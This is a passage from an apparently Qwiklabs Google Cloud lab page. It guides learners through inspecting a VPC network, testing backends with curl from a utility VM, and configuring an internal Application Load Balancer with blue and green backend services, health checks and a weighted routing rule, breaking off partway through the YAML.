cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='task-1-view-the-google-cloud-infrastructure-that-the-load-balancer-will-use'><span>Task 1. View the Google Cloud infrastructure that the load balancer will use</span></h4><h5 id='view-the-network-firewall-rules-and-cloud-router'><strong><span>View the network, firewall rules, and Cloud Router</span></strong></h5><p><span>The network </span><em><span>my-internal-app</span></em><span>, with </span><em><span>subnet-a</span></em><span> and </span><em><span>subnet-b</span></em><span> and firewall rules for RDP, SSH, and ICMP traffic, has been configured for you. Additional firewall rules have been configured to allow communication between the load balancer and the backends. Later, you create a regional internal Application Load Balancer in the my-internal-app network.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>VPC network &gt; VPC networks</span></strong><span>.</span></p><p><span>Each Google Cloud project starts with the </span><em><span>default</span></em><span> network. In addition, the </span><em><span>my-internal-app</span></em><span> network was created for you as part of your network diagram.</span></p><p><span>Note the </span><em><span>my-internal-app</span></em><span> network with its subnets: </span><em><span>subnet-a</span></em><span> and </span><em><span>subnet-b</span></em><span>. Both subnets are in the </span><code>Region</code><span> region.</span></p><p><span>Managed instance groups in </span><em><span>subnet-a</span></em><span> and </span><em><span>subnet-b</span></em><span> were also created for you.</span></p></li><li><p><span>(Optional) Click </span><strong><span>subnet-a</span></strong><span> and observe its configuration.</span></p></li><li><p><span>(Optional) Click </span><strong><span>subnet-b</span></strong><span> and observe its configuration.</span></p></li><li><p><span>In the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>VPC network &gt; Firewall</span></strong><span>.</span>
<span>Note the following firewall rules that were created for you:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Firewall rule</span></th><th style='text-align:left;' ><span>Purpose</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>app-allow-icmp</span></td><td style='text-align:left;' ><span>Allows ICMP communication</span></td></tr><tr><td style='text-align:left;' ><span>app-allow-ssh-rdp</span></td><td style='text-align:left;' ><span>Allows SSH and RDP over TCP ports 22 and 3389</span></td></tr><tr><td style='text-align:left;' ><span>fw-allow-health-checks</span></td><td style='text-align:left;' ><span>Allow health checks over TCP port 80</span></td></tr><tr><td style='text-align:left;' ><span>fw-allow-lb-access</span></td><td style='text-align:left;' ><span>Allow traffic in the 10.10.0.0/16 subnet</span></td></tr></tbody></table></figure></li><li><p><span>(Optional) View the contents of each firewall rule.</span></p></li><li><p><span>In the Google Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>View All Products</span></strong><span>. In the left hand pane, select </span><strong><span>Networking &gt; Network Connectivity &gt; Cloud Routers</span></strong><span>.</span>
<span>Note the </span><em><span>nat-router</span></em><span> Cloud Router that was created for the </span><em><span>my-internal-app</span></em><span> network. The load balancer will use this Cloud Router.</span></p></li></ol><h5 id='view-the-instance-groups'><strong><span>View the instance groups</span></strong></h5><p><span>The instance groups were created for you. Next, you will observe the configuration details.</span></p><ol start='' ><li><p><span>On the </span><strong><span>Navigation menu</span></strong><span>, click </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>.</span>
<span>Note the two VM instances that start with </span><em><span>instance-group-1</span></em><span> and </span><em><span>instance-group-2</span></em><span>.</span></p></li><li><p><span>Click </span><strong><span>instance-group-1</span></strong><span>.</span></p></li><li><p><span>Scroll to </span><strong><span>Network interfaces</span></strong><span>.</span>
<span>Note that the instance group is in </span><em><span>subnet-a</span></em><span>, and its internal IP address is </span><em><span>10.10.20.2</span></em><span>.</span></p></li><li><p><span>Return to the </span><strong><span>VM instances</span></strong><span> page, and repeat steps 2 and 3 for </span><strong><span>instance-group-2</span></strong><span>.</span>
<span>Note that this instance group is in </span><em><span>subnet-b</span></em><span>, and its internal IP address is </span><em><span>10.10.30.2</span></em><span>.</span></p></li></ol><h5 id='create-a-vm-for-testing'><strong><span>Create a VM for testing</span></strong></h5><p><span>You create a VM called </span><em><span>utility-vm</span></em><span> in </span><em><span>subnet-a</span></em><span> of the </span><em><span>my-internal-app</span></em><span> network and use it to test the load balancer.</span></p><ol start='' ><li><p><span>Return to the </span><strong><span>VM instances</span></strong><span> page, and click </span><strong><span>Create instance</span></strong><span>.</span></p></li><li><p><span>Specify the following, and leave the remaining settings as their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>utility-vm</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>&lt;REGION&gt;</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>&lt;ZONE 1&gt;</code></td></tr><tr><td style='text-align:left;' ><span>Series</span></td><td style='text-align:left;' ><span>E2</span></td></tr><tr><td style='text-align:left;' ><span>Machine type</span></td><td style='text-align:left;' ><span>e2-medium (2vCPU, 4 GB memory)</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>OS and storage</span></strong><span>.</span></p><p><span>Click </span><strong><span>Change</span></strong><span> to begin configuring your boot disk and select the following values:</span></p><ul><li><p><strong><span>Operating system</span></strong><span>: </span><code>Debian</code></p></li><li><p><strong><span>Version</span></strong><span>: </span><code>Debian GNU/Linux 12 (bookworm) x86/64, amd64</code></p></li></ul></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Network interfaces</span></strong><span>, click </span><strong><span>default</span></strong><span>.</span></p></li><li><p><span>Set the network interface properties and values as shown in the following table, and leave the remaining properties as their default values:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>my-internal-app</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>subnet-a</span></td></tr><tr><td style='text-align:left;' ><span>Primary internal IPv4 address</span></td><td style='text-align:left;' ><span>Ephemeral (Custom)</span></td></tr><tr><td style='text-align:left;' ><span>Custom ephemeral IP address</span></td><td style='text-align:left;' ><span>10.10.20.50</span></td></tr><tr><td style='text-align:left;' ><span>External IPv4 address</span></td><td style='text-align:left;' ><span>None</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span>
<span>Wait for the new VM to be created.</span></p></li></ol><h5 id='verify-the-backends'><span>Verify the backends</span></h5><ol start='' ><li><p><span>For </span><strong><span>utility-vm</span></strong><span>, click </span><strong><span>SSH</span></strong><span> to launch a terminal and connect.</span>
<span>If you see the </span><strong><span>Allow SSH-in-browser to connect to VMs</span></strong><span> pop-up, click </span><strong><span>Authorize</span></strong><span>.</span></p></li><li><p><span>To verify the welcome page for </span><strong><span>instance-group-1-xxxx</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.20.2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output is shown below. Note that the server location is set to </span><code>Zone 1</code><span>.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;h1&gt;Internal Load Balancing Lab&lt;/h1&gt;&lt;h2&gt;Client IP&lt;/h2&gt;Your IP address : 10.10.20.50&lt;h2&gt;Hostname&lt;/h2&gt;Server Hostname:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> instance-group-1-1zn8&lt;h2&gt;Server Location&lt;/h2&gt;Region and Zone: Zone 1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>To verify the welcome page for </span><strong><span>instance-group-2-xxxx</span></strong><span>, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl 10.10.30.2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output is shown below. Note that the server location is set to </span><code>Zone 2</code><span>.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;h1&gt;Internal Load Balancing Lab&lt;/h1&gt;&lt;h2&gt;Client IP&lt;/h2&gt;Your IP address : 10.10.20.50&lt;h2&gt;Hostname&lt;/h2&gt;Server Hostname:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> instance-group-2-q5wp&lt;h2&gt;Server Location&lt;/h2&gt;Region and Zone: Zone 2</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><p><span>Which of these fields identifies the location of the backend?</span></p><p>&nbsp;</p><p><span>Server Location</span></p><p>&nbsp;</p><p><span>Client IP</span></p><p>&nbsp;</p><p><span>Server Hostname</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> This will be useful when verifying that the load balancer sends traffic to both backends.</span></p><ol start='' ><li><p><span>Close the SSH terminal to </span><strong><span>utility-vm</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Finish setting up the network infrastructure.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-configure-the-load-balancer'><span>Task 2. Configure the load balancer</span></h4><p><span>Configure a regional internal Application Load Balancer to balance traffic between the two backends (</span><em><span>instance-group-1</span></em><span> in </span><code>Zone 1</code><span> and </span><em><span>instance-group-2</span></em><span> in </span><code>Zone 2</code><span>), as shown (the region and zones may vary as per the lab requirement):</span></p><p><img src="images/FgrZkcSEqghVxKV14KPVgNzTUMo0lQfmqTgpG45%2BTYA%3D.png" referrerpolicy="no-referrer" alt="The image shows a VPC network with two subnets, each with a managed instance group. One subnet is used for the blue deployment, and the other is used for the green deploynment. Client traffic to the subnets is handled by the load balancer."></p><h5 id='start-the-configuration'><strong><span>Start the configuration</span></strong></h5><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>View All Products</span></strong><span>. In the left hand pane, select </span><strong><span>Networking &gt; Network Services &gt; Load balancing</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create load balancer</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Application Load Balancer (HTTP/HTTPS)</span></strong><span>, click </span><strong><span>next</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Public facing or internal</span></strong><span>, select </span><strong><span>internal</span></strong><span> and click </span><strong><span>next</span></strong><span>. This selection creates a regional internal Application Load Balancer. This choice requires the backends to be in a single region </span><code>Region</code><span>.</span></p></li><li><p><span>For </span><strong><span>Cross-region or single region deployment</span></strong><span>, select </span><strong><span>Best for regional workloads</span></strong><span> and click </span><strong><span>next</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Configure</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>my-ilb</span></strong></p></li><li><p><span>For </span><strong><span>Region</span></strong><span>, select </span><strong><code>Region</code></strong></p></li><li><p><span>For </span><strong><span>Network</span></strong><span>, select </span><strong><span>my-internal-app</span></strong><span>.</span></p></li></ol><p><span>The proxy servers that implement the regional internal Application Load Balancer require IP addresses. These IP addresses are allocated automatically from a subnet that you specify.</span></p><ol start='' ><li><p><span>Under </span><strong><span>Proxy-only subnet required</span></strong><span>, click </span><strong><span>Reserve subnet</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>my-proxy-subnet</span></strong></p></li><li><p><span>For </span><strong><span>IP address range</span></strong><span>, type </span><strong><span>10.10.40.0/24</span></strong></p></li><li><p><span>Click </span><strong><span>Add</span></strong><span>.</span>
<span>Wait for the proxy-only subnet to be created. When that is successful, the console displays the name of the proxy-only subnet followed by the IP address range that you specified.</span></p></li></ol><h5 id='configure-the-blue-service-backend'><strong><span>Configure the blue-service backend</span></strong></h5><p><span>This backend service refers to the present (&quot;blue&quot;) version of your application.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Backend configuration</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Backend configuration</span></strong><span>, for </span><strong><span>Create or select backend service</span></strong><span>, select </span><strong><span>Create a backend service</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>blue-service</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Backends</span></strong><span>, specify the following, and leave the remaining settings as their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><span>instance-group-1</span></td></tr><tr><td style='text-align:left;' ><span>Port numbers</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Health check</span></strong><span>, select </span><strong><span>Create a health check</span></strong><span>.</span></p></li><li><p><span>Specify the following, and leave the remaining settings as their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>blue-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>TCP</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Check interval</span></td><td style='text-align:left;' ><span>10 seconds</span></td></tr><tr><td style='text-align:left;' ><span>Timeout</span></td><td style='text-align:left;' ><span>5 seconds</span></td></tr><tr><td style='text-align:left;' ><span>Healthy threshold</span></td><td style='text-align:left;' ><span>2</span></td></tr><tr><td style='text-align:left;' ><span>Unhealthy threshold</span></td><td style='text-align:left;' ><span>3</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> Health checks determine which instances can receive new connections. This HTTP health check polls instances every ten seconds and waits up to five seconds for a response. After two successful probe attempts, the backend is considered to be healthy. After three failed attempts, the backend is considered to be unhealthy.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Verify that there is a blue check mark next to </span><strong><span>Backend configuration</span></strong><span> in the Google Cloud console. If there isn&#39;t, double-check that you have completed all the steps above.</span></p></li></ol><h5 id='configure-the-green-service-backend'><strong><span>Configure the green-service backend</span></strong></h5><p><span>This backend service refers to the new (&quot;green&quot;) version of your application.</span></p><ol start='' ><li><p><span>For </span><strong><span>Backend configuration</span></strong><span>, for </span><strong><span>Create or select backend service</span></strong><span>, select </span><strong><span>Create a backend service</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><span>green-service</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Backends</span></strong><span>, specify the following, and leave the remaining settings as their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><span>instance-group-2</span></td></tr><tr><td style='text-align:left;' ><span>Port numbers</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Health check</span></strong><span>, select </span><strong><span>Create a health check</span></strong><span>.</span></p></li><li><p><span>Specify the following, and leave the remaining settings as their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>green-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>TCP</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Check interval</span></td><td style='text-align:left;' ><span>10 seconds</span></td></tr><tr><td style='text-align:left;' ><span>Timeout</span></td><td style='text-align:left;' ><span>5 seconds</span></td></tr><tr><td style='text-align:left;' ><span>Healthy threshold</span></td><td style='text-align:left;' ><span>2</span></td></tr><tr><td style='text-align:left;' ><span>Unhealthy threshold</span></td><td style='text-align:left;' ><span>3</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Under </span><strong><span>Backend services</span></strong><span>, you should now see two entries: one for the blue-service and another for the green-service. If you do not see the green-service, you will need to re-do the task </span><em><span>Configure the green-service backend</span></em><span>.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Ok</span></strong><span>.</span></p></li></ol><h5 id='configure-the-blue-green-routing-rule'><strong><span>Configure the &quot;blue-green&quot; routing rule</span></strong></h5><p><span>Create a routing rule that routes 70% of traffic to the blue-service and 30% of traffic to the green service.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Routing rules</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Routing rules</span></strong><span> panel, for </span><strong><span>Mode</span></strong><span>, select </span><strong><span>Advanded host and path rule</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add host and path rule</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Hosts</span></strong><span>, type </span><strong><span>*</span></strong><span>. The * (asterisk) matches all hosts.</span></p></li><li><p><span>Traffic management is configured using YAML format. Examine the following YAML code, and then copy and paste it into line 1 of the multi-line field </span><strong><span>Path matcher (matches, actions, and services)</span></strong><span>.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">defaultService: regions/Region/backendServices/blue-service</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">name: matcher1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">routeRules:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - matchRules:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; - prefixMatch: /</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; priority: 0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; routeAction:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; weightedBackendServices:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; - backendService: regions/Region/backendServices/blue-service</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; weight: 70</span></pre><pre class=" 